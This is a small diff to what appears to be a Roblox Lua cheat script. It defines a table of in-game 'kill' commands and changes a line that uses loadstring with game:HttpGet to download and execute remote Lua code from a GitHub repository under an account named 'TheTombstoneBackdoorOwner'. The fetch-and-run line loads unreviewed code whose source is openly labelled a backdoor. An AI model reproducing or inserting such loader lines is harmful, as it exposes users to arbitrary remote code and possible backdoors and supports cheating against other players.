@@ -67,5 +67,4 @@ getgenv().ScriptCommands = {
     ["Clear Multi Kill"] = "cksnhsnsnshill",
     ["Loop Gun Multi Player"] = "slgkillsjsjmsnsns",
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mango-Stand/refs/heads/main/Mango_Stand.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mango-Stand/refs/heads/main/loader.txt"))()
